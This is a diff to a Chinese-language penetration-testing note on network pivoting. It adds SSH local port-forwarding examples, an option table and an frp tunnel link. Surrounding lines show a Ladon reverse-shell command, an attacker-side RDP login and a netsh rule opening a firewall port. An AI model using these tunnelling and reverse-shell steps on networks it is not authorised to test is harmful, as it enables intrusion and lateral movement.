@@ -171,6 +171,7 @@ Ladon ReverseTcp 192.168.1.8 4444 meter
 只对tcp流量有效，所以udp和icmp都是不能代理转发的。 有ping之类的扫描工具要关掉
 
 ## frp
+[神兵利器 | Frp搭建多层内网通信隧道总结（建议收藏）](https://mp.weixin.qq.com/s/mO378TD7Jp3R8x7e7EpOCg)
 
 frpc
 ```shell
@@ -208,6 +209,22 @@ proxy tcp -p ":23080" -T tcp -P "22.22.22.33:33080"
 ![](https://s2.loli.net/2022/12/31/vdz5bXjOt368sHW.png)
 ![](https://s2.loli.net/2022/12/31/OVPkim34YNj5Wwy.png)
 
+```sh
+ssh -L localport:remotehost:remotehostport sshserver
+```
+
+| Label          | Desc                                                      |
+| -------------- | --------------------------------------------------------- |
+| localport      | 本机开启的端口号                                          |
+| remotehost     | 连接机器的IP地址                                          |
+| remotehostport | 转发机器的端口号                                          |
+| sshserver      | 转发机器的IP地址                                          |
+| Options        |                                                           |
+| -L             | 表示Local Port Forwarding，即本地端口转发                 |
+| -f             | 后台启用                                                  |
+| -N             | 不打开远程shell，处于等待状态(不加-N则会进入分配的命令行) |
+| -g             | 启用网关功能                                              |
+
 1.SSH远程端口转发
 ```shell
 # 示例1
@@ -217,6 +234,13 @@ ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N # 跳板机1.1.1.1 将3389 转发
 ## 攻击者
 attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPasswd
 
+
+# 示例2 将A:6666 转发为 B->C:80
+# B:192.168.0.106 C:10.10.10.154
+ssh -fN -L 本地端口:目标IP:目标端口   root@192.168.0.106
+ssh -fN -L 6666:10.10.10.154:80 root@192.168.0.106
+# 解析:A在本地访问自己的6666端口，就相当于通过B访问C的80端口
+# 即通过B将C的80端口转发到本地6666端口
 ```
 
 ![](https://s2.loli.net/2022/12/31/IAcaVtw671PUevX.jpg)
@@ -226,7 +250,8 @@ attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPasswd
 
 从attacker-pc转发80并从PC-1使其可用
 ```shell
-# 将pc-1:80 转发到 1.1.1.1,  访问 2.2.2.2:80相当于访问  1.1.1.1:80
+# 格式: ssh -N -L *:local_port:127.0.0.1:server_port tunne1user@1.1.1.1 
+# pc-1:2.2.2.2, 将pc-1:80 转发到 1.1.1.1,  访问 pc-1:80相当于访问 1.1.1.1:80
 PC-1$ ssh tunne1user@1.1.1.1 -L *:80:127.0.0.1:80 -N
 PC-1$ netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
 ```
